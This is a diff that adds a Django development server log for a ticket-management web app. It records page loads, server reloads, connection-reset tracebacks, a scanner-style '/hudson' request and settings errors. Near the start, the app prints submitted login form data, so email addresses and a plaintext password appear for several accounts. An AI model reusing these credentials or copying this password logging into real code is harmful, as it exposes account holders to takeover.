+[22/Nov/2020 07:12:33] "GET /static/css/2.43b2b750.chunk.css.map HTTP/1.1" 304 0
+[22/Nov/2020 07:12:33] "GET /static/css/main.807ab983.chunk.css.map HTTP/1.1" 304 0
+[22/Nov/2020 07:12:35] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 07:12:35] "GET /accounts/logout/ HTTP/1.1" 200 2
+[22/Nov/2020 07:12:42] "GET /login HTTP/1.1" 200 2613
+[22/Nov/2020 07:12:43] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 07:41:05] "GET /login HTTP/1.1" 200 2613
+[22/Nov/2020 07:41:05] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 304 0
+[22/Nov/2020 07:41:05] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 304 0
+[22/Nov/2020 07:41:05] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 07:41:05] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 07:41:05] "GET /favicon.ico HTTP/1.1" 200 2613
+/var/www/html/PeerXP_React/PeerXP_React/settings.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 22, 2020 - 04:47:25
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+b'email=burhanuddinabbas27%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'burhanuddinabbas27@gmail.com'), ('password', '19661999')]
+b'email=burhanuddinabbas27%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'burhanuddinabbas27@gmail.com'), ('password', '19661999')]
+b'email=john%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'john@gmail.com'), ('password', '19661999')]
+b'email=diana%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'diana@gmail.com'), ('password', '19661999')]
+b'email=diana%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'diana@gmail.com'), ('password', '19661999')]
+b'email=diana%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'diana@gmail.com'), ('password', '19661999')]
+[22/Nov/2020 07:44:05] "GET /login HTTP/1.1" 200 2613
+[22/Nov/2020 07:44:05] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 07:44:08] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 07:44:09] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 07:44:11] "POST /accounts/login/ HTTP/1.1" 200 17
+[22/Nov/2020 07:44:12] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 07:44:12] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1704
+[22/Nov/2020 07:44:14] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 07:44:14] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 07:44:14] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 08:07:27] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 08:35:27] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 08:35:28] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 200 2612
+[22/Nov/2020 08:35:28] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 200 2612
+[22/Nov/2020 08:35:28] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 200 2612
+[22/Nov/2020 08:35:28] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 200 2612
+[22/Nov/2020 08:35:28] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 08:35:28] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 08:35:43] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 08:35:44] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 200 2612
+[22/Nov/2020 08:35:44] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 200 2612
+[22/Nov/2020 08:35:44] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 200 2612
+[22/Nov/2020 08:35:44] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 200 2612
+[22/Nov/2020 08:35:45] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 08:35:45] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 08:36:00] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 08:36:00] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 200 2613
+[22/Nov/2020 08:36:00] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 200 2613
+[22/Nov/2020 08:36:00] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 200 2613
+[22/Nov/2020 08:36:00] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 200 2613
+[22/Nov/2020 08:36:01] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 08:36:01] "GET /logo192.png HTTP/1.1" 200 2613
+[22/Nov/2020 08:36:09] "GET /admin/ HTTP/1.1" 302 0
+[22/Nov/2020 08:36:09] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1808
+[22/Nov/2020 08:36:09] "GET /static/admin/css/base.css HTTP/1.1" 200 2613
+[22/Nov/2020 08:36:10] "GET /static/admin/css/login.css HTTP/1.1" 200 2613
+[22/Nov/2020 08:36:10] "GET /static/admin/css/responsive.css HTTP/1.1" 200 2613
+[22/Nov/2020 08:36:10] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 08:36:28] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 08:36:28] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 200 2612
+[22/Nov/2020 08:36:29] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 200 2612
+[22/Nov/2020 08:36:29] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 200 2612
+[22/Nov/2020 08:36:29] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 200 2612
+[22/Nov/2020 08:36:29] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 08:36:29] "GET /logo192.png HTTP/1.1" 200 2612
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 22, 2020 - 07:42:25
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+b'email=diana%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'diana@gmail.com'), ('password', '19661999')]
+Watching for file changes with StatReloader
+[22/Nov/2020 08:38:22] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 08:38:23] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 200 888
+[22/Nov/2020 08:38:24] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 200 15437
+[22/Nov/2020 08:38:24] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 200 144728
+[22/Nov/2020 08:38:24] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 200 303393
+[22/Nov/2020 08:38:29] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1704
+[22/Nov/2020 08:38:29] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 08:38:29] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 08:38:36] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 08:38:36] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1704
+[22/Nov/2020 08:38:36] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 08:38:36] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 08:38:44] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 08:38:44] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 08:38:44] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 08:38:44] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 08:38:44] "GET /tickets/fetch_ticket/6 HTTP/1.1" 200 408
+----------------------------------------
+Exception happened during processing of request from ('106.67.140.125', 18650)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('106.67.140.125', 22085)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('106.67.140.125', 55175)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('106.67.140.125', 20111)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[22/Nov/2020 10:07:21] "GET /hudson HTTP/1.1" 200 2613
+[22/Nov/2020 11:15:10] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 11:16:44] "GET / HTTP/1.1" 200 2613
+----------------------------------------
+Exception happened during processing of request from ('49.235.96.34', 60552)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 169, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[22/Nov/2020 12:45:37] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 13:36:06] "GET / HTTP/1.1" 200 2613
+----------------------------------------
+Exception happened during processing of request from ('216.218.206.67', 58134)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[22/Nov/2020 14:01:51] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 14:01:51] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 304 0
+[22/Nov/2020 14:01:51] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 304 0
+[22/Nov/2020 14:01:51] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 14:01:51] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 14:01:52] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1704
+[22/Nov/2020 14:01:52] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 14:01:52] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 14:02:01] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 14:02:01] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 14:02:01] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 14:02:02] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 14:02:02] "GET /tickets/fetch_ticket/6 HTTP/1.1" 200 408
+[22/Nov/2020 14:02:07] "POST /tickets/update_ticket/ HTTP/1.1" 201 16
+[22/Nov/2020 14:02:07] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 14:02:07] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 14:02:07] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1696
+[22/Nov/2020 14:06:09] "GET /tickets HTTP/1.1" 200 2612
+[22/Nov/2020 14:06:10] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 14:06:10] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 14:06:16] "GET /tickets HTTP/1.1" 200 2612
+[22/Nov/2020 14:06:16] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1696
+[22/Nov/2020 14:06:16] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 14:06:16] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 14:07:54] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 14:07:54] "GET /logo192.png HTTP/1.1" 200 2612
+[22/Nov/2020 14:08:38] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 14:15:44] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 15:40:21] "GET /new_ticket HTTP/1.1" 200 2612
+[22/Nov/2020 15:40:22] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 304 0
+[22/Nov/2020 15:40:22] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 304 0
+[22/Nov/2020 15:40:22] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 15:40:22] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 15:40:25] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 15:40:25] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 15:40:25] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+/var/www/html/PeerXP_React/PeerXP_React/settings.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 22, 2020 - 08:38:04
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/var/www/html/PeerXP_React/PeerXP_React/settings.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 22, 2020 - 15:47:52
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/var/www/html/PeerXP_React/PeerXP_React/settings.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 22, 2020 - 15:50:08
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+Exception in thread django-main-thread:
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/threading.py", line 932, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.8/threading.py", line 870, in run
+    self._target(*self._args, **self._kwargs)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/utils/autoreload.py", line 54, in wrapper
+    fn(*args, **kwargs)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/management/commands/runserver.py", line 117, in inner_run
+    self.check(display_num_errors=True)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/management/base.py", line 436, in check
+    raise SystemCheckError(msg)
+django.core.management.base.SystemCheckError: SystemCheckError: System check identified some issues:
+
+ERRORS:
+?: (staticfiles.E002) The STATICFILES_DIRS setting should not contain the STATIC_ROOT setting.
+
+System check identified 1 issue (0 silenced).
+/var/www/html/PeerXP_React/PeerXP_React/settings.py changed, reloading.
+Performing system checks...
+
+Watching for file changes with StatReloader
+Exception in thread django-main-thread:
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/threading.py", line 932, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.8/threading.py", line 870, in run
+    self._target(*self._args, **self._kwargs)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/utils/autoreload.py", line 54, in wrapper
+    fn(*args, **kwargs)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/management/commands/runserver.py", line 117, in inner_run
+    self.check(display_num_errors=True)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/management/base.py", line 436, in check
+    raise SystemCheckError(msg)
+django.core.management.base.SystemCheckError: SystemCheckError: System check identified some issues:
+
+ERRORS:
+?: (staticfiles.E002) The STATICFILES_DIRS setting should not contain the STATIC_ROOT setting.
+
+System check identified 1 issue (0 silenced).
+/var/www/html/PeerXP_React/PeerXP_React/settings.py changed, reloading.
+Performing system checks...
+
+Watching for file changes with StatReloader
+Exception in thread django-main-thread:
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/threading.py", line 932, in _bootstrap_inner
+    self.run()
+  File "/usr/lib/python3.8/threading.py", line 870, in run
+    self._target(*self._args, **self._kwargs)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/utils/autoreload.py", line 54, in wrapper
+    fn(*args, **kwargs)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/management/commands/runserver.py", line 117, in inner_run
+    self.check(display_num_errors=True)
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/management/base.py", line 436, in check
+    raise SystemCheckError(msg)
+django.core.management.base.SystemCheckError: SystemCheckError: System check identified some issues:
+
+ERRORS:
+?: (staticfiles.E002) The STATICFILES_DIRS setting should not contain the STATIC_ROOT setting.
+
+System check identified 1 issue (0 silenced).
+/var/www/html/PeerXP_React/PeerXP_React/settings.py changed, reloading.
+Performing system checks...
+
+Watching for file changes with StatReloader
+Invalid HTTP_HOST header: '13.233.215.193:8080'. You may need to add '13.233.215.193' to ALLOWED_HOSTS.
+Bad Request: /new_ticket
+[22/Nov/2020 16:06:26] "GET /new_ticket HTTP/1.1" 400 63654
+Invalid HTTP_HOST header: '13.233.215.193:8080'. You may need to add '13.233.215.193' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[22/Nov/2020 16:06:27] "GET /favicon.ico HTTP/1.1" 400 63463
+Invalid HTTP_HOST header: '13.233.215.193:8080'. You may need to add '13.233.215.193' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Nov/2020 16:35:59] "GET / HTTP/1.1" 400 61040
+Invalid HTTP_HOST header: '13.233.215.193:8080'. You may need to add '13.233.215.193' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Nov/2020 17:08:29] "GET / HTTP/1.1" 400 61043
+Invalid HTTP_HOST header: '13.233.215.193:8080'. You may need to add '13.233.215.193' to ALLOWED_HOSTS.
+Bad Request: /
+[22/Nov/2020 18:19:30] "GET / HTTP/1.1" 400 61855
+Invalid HTTP_HOST header: '13.233.215.193:8080'. You may need to add '13.233.215.193' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[22/Nov/2020 18:19:31] "GET /favicon.ico HTTP/1.1" 400 61900
+Invalid HTTP_HOST header: '13.233.215.193:8080'. You may need to add '13.233.215.193' to ALLOWED_HOSTS.
+Bad Request: /admin/
+[22/Nov/2020 18:21:02] "GET /admin/ HTTP/1.1" 400 61921
+Invalid HTTP_HOST header: '13.233.215.193:8080'. You may need to add '13.233.215.193' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[22/Nov/2020 18:21:03] "GET /favicon.ico HTTP/1.1" 400 61906
+/var/www/html/PeerXP_React/PeerXP_React/settings.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 22, 2020 - 16:06:11
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+[22/Nov/2020 18:37:51] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 18:37:52] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 304 0
+[22/Nov/2020 18:37:52] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 18:37:52] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 304 0
+[22/Nov/2020 18:37:52] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 304 0
+[22/Nov/2020 18:37:54] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1696
+[22/Nov/2020 18:37:54] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:39:37] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 18:39:37] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 200 888
+[22/Nov/2020 18:39:37] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 200 15437
+[22/Nov/2020 18:39:38] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 200 144728
+[22/Nov/2020 18:39:38] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 200 303393
+[22/Nov/2020 18:39:39] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 18:39:57] "GET /admin/ HTTP/1.1" 200 7474
+[22/Nov/2020 18:39:57] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[22/Nov/2020 18:39:57] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[22/Nov/2020 18:39:57] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
+[22/Nov/2020 18:39:57] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[22/Nov/2020 18:39:58] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[22/Nov/2020 18:39:58] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[22/Nov/2020 18:39:59] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[22/Nov/2020 18:39:59] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[22/Nov/2020 18:39:59] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[22/Nov/2020 18:39:59] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:40:12] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 18:40:12] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 200 888
+[22/Nov/2020 18:40:12] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 200 15437
+[22/Nov/2020 18:40:13] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 200 144728
+[22/Nov/2020 18:40:13] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 200 303393
+[22/Nov/2020 18:40:13] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 18:40:45] "GET /admin/ HTTP/1.1" 302 0
+[22/Nov/2020 18:40:46] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1808
+[22/Nov/2020 18:40:46] "GET /static/admin/css/login.css HTTP/1.1" 200 1233
+[22/Nov/2020 18:40:46] "GET /static/admin/css/responsive.css HTTP/1.1" 200 17944
+[22/Nov/2020 18:40:46] "GET /static/admin/css/base.css HTTP/1.1" 200 16378
+[22/Nov/2020 18:40:46] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[22/Nov/2020 18:40:46] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[22/Nov/2020 18:40:46] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[22/Nov/2020 18:40:46] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 18:41:07] "POST /accounts/login/ HTTP/1.1" 200 17
+[22/Nov/2020 18:41:07] "GET /tickets/tickets/?format=json HTTP/1.1" 200 373
+[22/Nov/2020 18:41:07] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:41:12] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 18:41:12] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:41:12] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 18:44:19] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 18:44:20] "GET /favicon.ico HTTP/1.1" 200 2613
+[22/Nov/2020 18:44:40] "POST /accounts/login/ HTTP/1.1" 200 17
+[22/Nov/2020 18:44:41] "GET /tickets/tickets/?format=json HTTP/1.1" 200 373
+[22/Nov/2020 18:44:41] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:44:46] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 18:44:46] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:44:46] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 18:44:46] "GET /tickets/fetch_ticket/8 HTTP/1.1" 200 396
+[22/Nov/2020 18:44:54] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 18:44:54] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:44:54] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+Forbidden (CSRF token missing or incorrect.): /admin/login/
+[22/Nov/2020 18:45:04] "POST /admin/login/?next=/admin/ HTTP/1.1" 403 2513
+[22/Nov/2020 18:45:04] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:45:05] "GET /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[22/Nov/2020 18:45:06] "GET /admin/ HTTP/1.1" 200 4600
+[22/Nov/2020 18:45:06] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 412
+[22/Nov/2020 18:45:06] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[22/Nov/2020 18:45:06] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[22/Nov/2020 18:45:06] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[22/Nov/2020 18:45:06] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:45:15] "GET /admin/auth/group/ HTTP/1.1" 200 3490
+[22/Nov/2020 18:45:15] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6170
+[22/Nov/2020 18:45:15] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[22/Nov/2020 18:45:15] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6918
+[22/Nov/2020 18:45:15] "GET /static/admin/js/core.js HTTP/1.1" 200 7099
+[22/Nov/2020 18:45:15] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 363
+[22/Nov/2020 18:45:15] "GET /static/admin/js/actions.js HTTP/1.1" 200 6766
+[22/Nov/2020 18:45:15] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8941
+[22/Nov/2020 18:45:15] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1530
